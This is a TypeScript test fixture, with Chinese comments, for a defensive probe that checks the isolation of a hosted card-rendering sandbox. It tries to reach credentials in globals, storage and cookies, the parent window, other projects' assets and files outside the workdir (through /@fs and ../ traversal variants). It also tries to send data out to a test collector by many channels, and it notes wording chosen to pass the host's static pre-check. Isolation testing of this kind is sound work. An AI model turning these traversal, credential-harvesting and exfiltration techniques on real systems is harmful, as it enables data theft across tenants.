/**
 * 越权探测卡的探测清单（测试夹具；定义见 `docs/plan/sound-online-render-task.md`「越权探测卡」一节）。
 *
 * **这是给我们自己的隔离做验收的防御性测试夹具，不是攻击代码**：只在测试环境里用，不进卡片库、不随发版。它是一张普通用户卡的一部分，
 * 在自己的代码里按一份**固定清单**逐项*尝试*读取本不该读到的东西，把每一项「读到了什么 / 被拒了 / 报了什么错」记进一个结果对象，
 * 由探针（`scripts/probes/hosted-render-isolation-probe.mjs`）取回来断言。
 *
 *   - 只读、只报告：不删、不改、不占资源，不绕过浏览器或系统的安全机制；每一项都是 `try { 读 } catch { 记错误 }`；
 *   - 探针事先在各处放的是**只属于测试的假凭证**（形如 `PROBE-FAKE-…` 的占位字符串）；不涉及任何真实凭证、真实项目、真实外部地址——
 *     清单里的地址全部由探针经片段参数给，都是本机回环上的测试端口（「测试专用的外部地址」是探针自己在回环上起的收集站）；
 *   - 这一帧等清单跑完再出（用卡片的常规办法 `beginFrameWork`，同 Lottie 卡等素材载入），所以结果一定打得出来；
 *   - 结果怎么回去：`console.log` 分块打出来（渲染用的 Chrome 的页面日志进工作进程的输出，探针从那里取）。
 *     **断言不看这里的自述**，看取回来的内容里有没有假凭证、收集站收到没有。
 *
 * 写法上的两点（不是为了躲什么，是这份文件要过装卡时的常规检查）：计时用 `AbortSignal.timeout`，不用定时器；
 * 按运行时才知道的地址载入模块时经 `new Function` 调 `import()`（托管方的同步文件预检只许字面量的动态导入）。
 */

type Ctx = {
  tag: string;
  /** 本机回环上的各个测试端口（探针给）：名字 → 地址 */
  loopback?: Record<string, string>;
  /** 探针自己起的收集站（当作「外部地址」） */
  collector?: string;
  /** 云厂商元数据地址（只验连不上） */
  metadata?: string;
  /** 工作目录以外、放了假凭证的文件（绝对路径） */
  outsideFiles?: string[];
  /** 别的项目的东西：项目 id、文档 id、素材哈希 */
  other?: { projectId?: string; docId?: string; assetHash?: string };
  /** 自己项目的一块素材（对照：这个读得到才对） */
  ownAssetHash?: string;
  /** 只有别的项目才有的卡片文件（仓库相对路径） */
  foreignCardFiles?: string[];
};

type Entry = { ok: boolean; got?: string; err?: string };
type Report = { tag: string; href: string; items: Record<string, Entry> };

const CLIP = 600;
const clip = (v: unknown) => { let s = ""; try { s = typeof v === "string" ? v : JSON.stringify(v); } catch { s = String(v); } return (s ?? "").slice(0, CLIP); };
const failed = (e: unknown): Entry => ({ ok: false, err: `${(e as any)?.name ?? "Error"}: ${String((e as any)?.message ?? e).slice(0, 200)}` });

async function attempt(items: Record<string, Entry>, name: string, fn: () => unknown) {
  try { items[name] = { ok: true, got: clip(await fn()) }; } catch (e) { items[name] = failed(e); }
}

/** 取一个地址，回「状态码 + 正文开头」；连不上、被拦、跨源读不到都会抛错，由 `attempt` 记下 */
async function fetchText(url: string, init: RequestInit = {}) {
  const res = await fetch(url, { ...init, signal: AbortSignal.timeout(4000) });
  const body = res.type === "opaque" ? "(opaque)" : await res.text();
  return `${res.status} ${res.type} ${body.slice(0, CLIP)}`;
}

/** 页面预置脚本把 `WebSocket` 换成了不连网的替身（挡开发服务器的热更新）；这里从一个空白子框架里拿浏览器原来的那个来试（只建一个，用完留着不管） */
let nativeWs: typeof WebSocket | null | undefined;
function nativeWebSocket(): typeof WebSocket | null {
  if (nativeWs !== undefined) return nativeWs;
  try {
    const frame = document.createElement("iframe");
    frame.style.display = "none";
    document.body.appendChild(frame);
    nativeWs = (frame.contentWindow as any)?.WebSocket ?? null;
  } catch { nativeWs = null; }
  return nativeWs ?? null;
}

/** 让一个隐藏的子框架去打开一个地址（子框架的导航也是一次出网）；只看它载没载入，读不到别的源的内容 */
function frameLoad(url: string): Promise<string> {
  return new Promise((resolve) => {
    const frame = document.createElement("iframe");
    frame.style.display = "none";
    const stop = AbortSignal.timeout(2500);
    const finish = (how: string) => { try { frame.remove(); } catch { /* 已摘 */ } resolve(how); };
    frame.onload = () => { let seen = "(读不到)"; try { seen = String(frame.contentDocument?.body?.innerText ?? "").slice(0, 200); } catch { /* 别的源 */ } finish(`load ${seen}`); };
    frame.onerror = () => finish("error");
    stop.addEventListener("abort", () => finish("超时"));
    frame.src = url;
    document.body.appendChild(frame);
  });
}

function wsOpen(url: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const Ctor = nativeWebSocket();
    if (!Ctor) return reject(new Error("拿不到 WebSocket"));
    let ws: WebSocket;
    try { ws = new Ctor(url, ["promptcut.v1"]); } catch (e) { return reject(e); }
    const stop = AbortSignal.timeout(4000);
    stop.addEventListener("abort", () => { try { ws.close(); } catch { /* 已关 */ } reject(new Error("超时")); });
    ws.onopen = () => { try { ws.close(); } catch { /* 已关 */ } resolve("open"); };
    ws.onerror = () => reject(new Error("error"));
    ws.onclose = (ev) => reject(new Error(`closed ${ev.code}`));
  });
}

/** 全局对象上走两层，把字符串都收上来（探针在里面找假凭证与票据形状的串） */
function dumpGlobals(): string {
  const parts: string[] = [];
  const seen = new Set<unknown>();
  const skip = /^(window|self|top|parent|frames|globalThis|document|location|navigator|performance|localStorage|sessionStorage|indexedDB|caches|cookieStore)$/;
  const walk = (v: unknown, depth: number, at: string) => {
    if (parts.length > 4000) return;
    if (typeof v === "string") { if (v.length >= 8) parts.push(`${at}=${v.slice(0, 300)}`); return; }
    if (v === null || (typeof v !== "object" && typeof v !== "function") || depth > 2 || seen.has(v)) return;
    seen.add(v);
    if (typeof Node !== "undefined" && v instanceof Node) return;
    let keys: string[] = [];
    try { keys = Object.getOwnPropertyNames(v); } catch { return; }
    for (const k of keys.slice(0, 400)) {
      if (depth === 0 && skip.test(k)) continue;
      let child: unknown;
      try { child = (v as any)[k]; } catch { continue; }
      walk(child, depth + 1, `${at}.${k}`);
    }
  };
  walk(globalThis, 0, "g");
  return parts.join("\n");
}

async function listIndexedDb(): Promise<string> {
  const dbs = await indexedDB.databases();
  return JSON.stringify(dbs.map((d) => d.name));
}

/** 经运行时才知道的地址载入一个模块（开发服务器会不会把工作目录以外的文件当模块交出来） */
const importAt = new Function("u", "return import(u)") as (u: string) => Promise<any>;

export async function runOverreach(ctx: Ctx): Promise<Report> {
  const items: Record<string, Entry> = {};
  const t = (name: string, fn: () => unknown) => attempt(items, name, fn);

  // 各类并行跑（一类之内有先后）：整份清单几秒钟做完，不拖住这一帧太久
  const sections: (() => Promise<void>)[] = [];
  const section = (fn: () => Promise<void>) => { sections.push(fn); };

  /* ---------- 一、页面上的全局对象里有没有凭证、票据 */
  section(async () => {
  await t("globals.dump", () => dumpGlobals());
  await t("globals.pcKeys", () => Object.getOwnPropertyNames(globalThis).filter((k) => /^__pc|ticket|token|secret|broker/i.test(k)));
  await t("globals.env", () => JSON.stringify((import.meta as any).env ?? null));
  await t("globals.process", () => JSON.stringify((globalThis as any).process?.env ?? null));

  });

  /* ---------- 二、本机存储 */
  section(async () => {
  await t("storage.localStorage", () => JSON.stringify(Object.entries({ ...localStorage })));
  await t("storage.sessionStorage", () => JSON.stringify(Object.entries({ ...sessionStorage })));
  await t("storage.cookie", () => document.cookie);
  await t("storage.indexedDB", () => listIndexedDb());
  await t("storage.caches", async () => JSON.stringify(await caches.keys()));

  });

  /* ---------- 三、父页面与同源的别的窗口 */
  section(async () => {
  await t("window.isTop", () => String(window.parent === window && window.top === window));
  await t("window.opener", () => String(window.opener));
  await t("window.parent.document", () => (window.parent === window ? "(自己就是顶层)" : String(window.parent.document.title)));
  await t("window.parent.cookie", () => (window.parent === window ? "(自己就是顶层)" : String(window.parent.document.cookie)));
  await t("window.frames", () => String(window.frames.length));
  await t("window.referrer", () => document.referrer);
  await t("window.broadcast", () => new Promise((resolve) => {
    // 同源的别的窗口若在同一个频道上说话，这里听得到；只听，不发
    const ch = new BroadcastChannel("promptcut");
    const heard: string[] = [];
    ch.onmessage = (ev) => heard.push(clip(ev.data));
    AbortSignal.timeout(500).addEventListener("abort", () => { ch.close(); resolve(JSON.stringify(heard)); });
  }));

  });

  /* ---------- 四、本机回环地址与工作进程自己的接口 */
  section(async () => {
  const sameOrigin = [
    "/api/frames/queue", "/api/prerender/info", "/api/cards/sync/status", "/api/cards/list", "/api/projects/list", "/api/ai/config",
    "/api/media/list", "/api/media/local?hashes=" + "0".repeat(64), "/api/docservice/info", "/api/costs", "/api/skill/state",
    // 开发服务器自带的口：不带 file 参数，即使没被拦也只会回一句「缺参数」，不会真的去开编辑器
    "/__open-in-editor",
  ];
  await Promise.all(sameOrigin.map((p) => t(`self.GET ${p}`, () => fetchText(p))));
  // 「看画面」的那批接口（云端 Agent 经管理进程转来才出图）：页面自己来要。没被拦也只是「缺少 project」/「没有这条记录」，不会渲任何东西
  await t("self.POST /api/vision/snapshot", () => fetchText("/api/vision/snapshot", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" }));
  await t("self.GET /api/ai/visual/v-000000.json", () => fetchText("/api/ai/visual/v-000000.json"));
  // 写方法：发给一条不存在的接口——没被拦也只是 404，不会改到任何东西
  await t("self.POST /api/overreach-probe/no-such-endpoint", () => fetchText("/api/overreach-probe/no-such-endpoint", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" }));
  await t("self.ws", () => wsOpen(`ws://${location.host}/`));
  });
  section(async () => {
    await Promise.all(Object.entries(ctx.loopback ?? {}).flatMap(([name, base]) => [
      t(`loopback.${name}.cors`, () => fetchText(base)),
      t(`loopback.${name}.no-cors`, () => fetchText(base, { mode: "no-cors" })),
      t(`loopback.${name}.ws`, () => wsOpen(base.replace(/^http/, "ws"))),
      // 根页可能载入完整舞台及子资源；只读不存在 API 的导航仍验跨源/页面闸，不留下应用级长连接。
      t(`loopback.${name}.frame`, () => frameLoad(`${base}/api/overreach-probe/no-such-endpoint`)),
    ]));
  });
  section(async () => {
  // P1/P3撤销出口护栏：不执行真实云metadata请求，不能再把不出网作为权限保证。
  await t("metadata.not-applicable", () => "不适用：卡片出口护栏本三个版本不做；未请求元数据地址");

  });

  /* ---------- 五、别的项目的内容与素材 */
  section(async () => {
  const other = ctx.other ?? {};
  if (other.assetHash) {
    await t("other.asset.self-route", () => fetchText(`/api/asset/media/${other.assetHash}`));
    await t("other.asset.media-route", () => fetchText(`/@media/${other.assetHash}`));
    await t("other.asset.media-file", () => fetchText(`/api/media/file?hash=${other.assetHash}`));
  }
  if (other.docId) {
    await t("other.project.export", () => fetchText(`/api/export/project/${other.docId}`));
    await t("other.project.export-timeline", () => fetchText(`/api/export/timeline/${other.docId}`));
  }
  for (const rel of ctx.foreignCardFiles ?? []) {
    await t(`other.card ${rel}`, () => fetchText(`/${rel}`));
    await t(`other.card ${rel}?raw`, () => fetchText(`/${rel}?raw`));
  }
  if (ctx.ownAssetHash) await t("own.asset", () => fetchText(`/@media/${ctx.ownAssetHash}`));
  await t("other.overlayListing", () => fetchText("/src/cards/userOverlay.ts"));
  await t("other.loadedMarkers", () => JSON.stringify((globalThis as any).__pcOverreachLoaded ?? null));

  });

  /* ---------- 六、测试专用的外部地址（探针的收集站） */
  section(async () => {
  if (ctx.collector) {
    const c = ctx.collector;
    await t('collector.resource.image', async () => {const image=new Image();image.src=`${c}/collect.png?tag=${ctx.tag}`;await image.decode();return image.naturalWidth===4?'loaded':'invalid';});
    await t('collector.resource.font', async () => {const font=new FontFace('HostedPublicProbe',`url(${c}/public-font.ttf)`);document.fonts.add(await font.load());return font.status;});
    const stylesheet = async (url: string) => {const link=document.createElement('link');link.rel='stylesheet';link.href=url;const ready=new Promise<void>((resolve,reject)=>{link.onload=()=>resolve();link.onerror=()=>reject(new Error('样式载入失败'));});document.head.append(link);await ready;};
    await t('collector.resource.style', async () => {await stylesheet(`${c}/public-style.css`);return getComputedStyle(document.documentElement).getPropertyValue('--pc-public-style').trim();});
    await t('collector.resource.import', async () => {await stylesheet(`${c}/public-import.css`);return getComputedStyle(document.documentElement).getPropertyValue('--pc-public-import').trim();});
    await t('collector.resource.script', async () => {const script=document.createElement('script');script.src=`${c}/public-script.js`;const ready=new Promise<void>((resolve,reject)=>{script.onload=()=>resolve();script.onerror=()=>reject(new Error('脚本载入失败'));});document.head.append(script);await ready;return String((globalThis as any).__pcPublicExternalScript);});
    await Promise.all([
      t("collector.fetch", () => fetchText(`${c}/collect?via=fetch&tag=${ctx.tag}`, { mode: "no-cors" })),
      t("collector.post", () => fetchText(`${c}/collect?via=post&tag=${ctx.tag}`, { method: "POST", mode: "no-cors", body: "overreach-probe" })),
      t("collector.beacon", () => String(navigator.sendBeacon(`${c}/collect?via=beacon&tag=${ctx.tag}`, "overreach-probe"))),
      t("collector.image", () => new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = () => resolve("loaded");
        img.onerror = () => reject(new Error("error"));
        img.src = `${c}/collect.png?via=image&tag=${ctx.tag}`;
      })),
      t("collector.ws", () => wsOpen(`${c.replace(/^http/, "ws")}/collect?via=ws&tag=${ctx.tag}`)),
      t("collector.frame", () => frameLoad(`${c}/collect?via=frame&tag=${ctx.tag}`)),
      t("collector.prefetch", () => new Promise((resolve) => {
        const link = document.createElement("link");
        link.rel = "prefetch";
        link.href = `${c}/collect?via=prefetch&tag=${ctx.tag}`;
        link.onload = () => resolve("load");
        link.onerror = () => resolve("error");
        AbortSignal.timeout(1500).addEventListener("abort", () => resolve("超时"));
        document.head.appendChild(link);
      })),
      t("collector.webrtc", () => new Promise((resolve, reject) => {
        // 只发一次探路（STUN），不建连接；收集站在同一端口上数 UDP 包
        const host = new URL(c);
        const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:${host.hostname}:${host.port}` }] });
        pc.createDataChannel("overreach-probe");
        const seen: string[] = [];
        pc.onicecandidate = (ev) => { if (ev.candidate) seen.push(ev.candidate.type ?? "?"); else { pc.close(); resolve(JSON.stringify(seen)); } };
        pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(reject);
        AbortSignal.timeout(3000).addEventListener("abort", () => { pc.close(); resolve(JSON.stringify(seen)); });
      })),
    ]);
  }

  });

  /* ---------- 七、Node 一侧处理时读工作目录以外的文件（经开发服务器的各种取文件写法） */
  for (const [i, file] of (ctx.outsideFiles ?? []).entries()) section(async () => {
    const abs = file.replace(/\\/g, "/");
    const fsUrl = `/@fs/${abs.replace(/^\//, "")}`;
    const variants: Record<string, string> = {
      plain: fsUrl, raw: `${fsUrl}?raw`, url: `${fsUrl}?url`, inline: `${fsUrl}?inline`, importRaw: `${fsUrl}?import&raw`,
      rawTrailing: `${fsUrl}?raw??`, importInline: `${fsUrl}?import&inline=1.wasm?init`,
      traversal: `/src/cards/user/${"../".repeat(12)}${abs.replace(/^[A-Za-z]:\//, "").replace(/^\//, "")}?raw`,
      encoded: `/src/cards/user/${"..%2f".repeat(12)}${abs.replace(/^[A-Za-z]:\//, "").replace(/^\//, "")}?raw`,
    };
    for (const [how, url] of Object.entries(variants)) await t(`outside[${i}].${how}`, () => fetchText(url));
    await t(`outside[${i}].import`, async () => clip((await importAt(`${fsUrl}?raw`)).default));
    await t(`outside[${i}].file-scheme`, () => fetchText(`file:///${abs.replace(/^\//, "")}`));
  });

  await Promise.all(sections.map((run) => run().catch(() => {})));
  // 记录按名字排好，方便对照
  const sorted: Record<string, Entry> = {};
  for (const k of Object.keys(items).sort()) sorted[k] = items[k];
  return { tag: ctx.tag, href: location.origin, items: sorted };
}

/** 结果分块打进页面日志：`OVERREACH-RESULT <tag> <第几块>/<共几块> <base64 片段>` */
export function emitReport(report: Report) {
  const bytes = new TextEncoder().encode(JSON.stringify(report));
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  const b64 = btoa(bin);
  const SIZE = 1200;
  const total = Math.ceil(b64.length / SIZE) || 1;
  const run = Math.random().toString(36).slice(2, 10);
  for (let i = 0; i < total; i += 1) console.log(`OVERREACH-RESULT ${report.tag} ${run} ${i + 1}/${total} ${b64.slice(i * SIZE, (i + 1) * SIZE)}`);
}
